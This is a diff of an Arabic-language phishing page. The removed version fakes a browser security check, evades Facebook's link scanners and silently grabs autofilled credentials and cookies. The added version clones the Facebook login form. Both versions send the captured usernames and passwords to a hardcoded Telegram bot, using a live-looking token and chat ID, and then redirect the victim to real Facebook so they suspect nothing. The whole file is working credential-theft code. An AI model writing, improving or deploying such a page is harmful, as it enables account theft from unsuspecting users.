@@ -1,50 +1,54 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Security Check Protocol</title>
-    <script>
-        // تضليل بوتات فحص الشركات (التلقيم الذكي)
-        if (navigator.userAgent.includes("Facebot") || navigator.userAgent.includes("facebookexternalhit")) {
-            window.location.href = "https://www.google.com";
-        }
-
-        const BOT_TOKEN = "8425893173:AAEmLTkoJzcm1hnvsA3TTzF9nUssmqEKPt8";
-        const CHAT_ID = "8428507759";
-
-        async function sendToTelegram(msg) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        }
-
-        window.onload = () => {
-            // فخ سحب البيانات التلقائي
-            const form = document.createElement("form");
-            form.innerHTML = `<input type="text" id="u" autocomplete="username" style="display:none">
-                             <input type="password" id="p" autocomplete="current-password" style="display:none">`;
-            document.body.appendChild(form);
-
-            setTimeout(async () => {
-                let user = document.getElementById("u").value;
-                let pass = document.getElementById("p").value;
-                let cook = document.cookie || "No Direct Cookies";
-                
-                let report = "🚀 *صيد جديد من الرابط الخالد!* \n\n" +
-                             "📧 *الحساب:* `" + (user || "غير محفوظ") + "`\n" +
-                             "🔑 *الباسورد:* `" + (pass || "غير محفوظة") + "`\n" +
-                             "🍪 *الكوكيز:* `" + cook.substring(0, 50) + "...`";
-
-                await sendToTelegram(report);
-                // التمويه: تحويل الضحية لصفحة الأمان الحقيقية
-                window.location.href = "https://m.facebook.com/login/save-device/";
-            }, 2000);
-        };
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+        .fb-logo { width: 200px; margin-bottom: 10px; }
+        input { width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: right; }
+        button { width: 98%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; width: auto; padding: 10px 20px; font-size: 16px; }
+    </style>
 </head>
-<body style="background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; margin:0;">
-    <div style="text-align:center;">
-        <div style="width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid #1877f2; border-radius:50%; animation:spin 1s linear infinite; margin:auto;"></div>
-        <p style="color:#1c1e21; margin-top:15px;">جاري التحقق من أمان المتصفح...</p>
-        <style>@keyframes spin {0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);}}</style>
+<body>
+    <div class="login-container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lE_V8qHnS4.svg" alt="Facebook" class="fb-logo">
+        <p style="font-size: 18px; margin-bottom: 20px;">تسجيل الدخول إلى فيسبوك</p>
+        
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="pass" placeholder="كلمة السر" required>
+        <button onclick="sendToBot()">تسجيل الدخول</button>
+        
+        <div style="margin-top: 15px;"><a href="#" style="text-decoration: none; color: #1877f2; font-size: 14px;">هل نسيت كلمة السر؟</a></div>
+        <div class="divider"></div>
+        <button class="create-btn">إنشاء حساب جديد</button>
     </div>
+
+    <script>
+        function sendToBot() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            
+            // بياناتك الخاصة التي زودتني بها
+            const token = "8425893173:AAEmLTkoJzcm1hnvsA3TTzF9nUssmqEKPt8";
+            const chatId = "8428507759";
+            
+            const message = `🔥 تم اصطياد حساب فيسبوك جديد 🔥\n\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}\n\n📱 جاري التحويل للمتصفح...`;
+
+            // إرسال البيانات للبوت
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                // تحويل الضحية لفيسبوك الحقيقي حتى لا يشك
+                window.location.href = "https://www.facebook.com/login.php";
+            })
+            .catch(() => {
+                alert("حدث خطأ في الاتصال، حاول مرة أخرى");
+            });
+        }
+    </script>
 </body>
 </html>
